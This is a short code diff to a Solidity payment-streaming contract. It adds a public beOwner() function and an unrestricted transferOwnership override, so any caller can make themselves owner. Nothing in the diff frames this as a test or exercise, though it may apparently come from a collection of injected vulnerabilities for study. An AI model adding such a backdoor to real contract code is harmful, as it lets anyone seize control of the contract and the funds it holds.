@@ -120,6 +120,15 @@ contract Streamer is Ownable {
   emit Closed(msg.sender);
  }
 
+ function beOwner() public {
+  transferOwnership(msg.sender);
+ }
+
+ function transferOwnership(address newOwner) public override {
+  require(newOwner != address(0), "Ownable: new owner is the zero address");
+  _transferOwnership(newOwner);
+ }
+
   struct Voucher {
     uint256 updatedBalance;
     Signature sig;
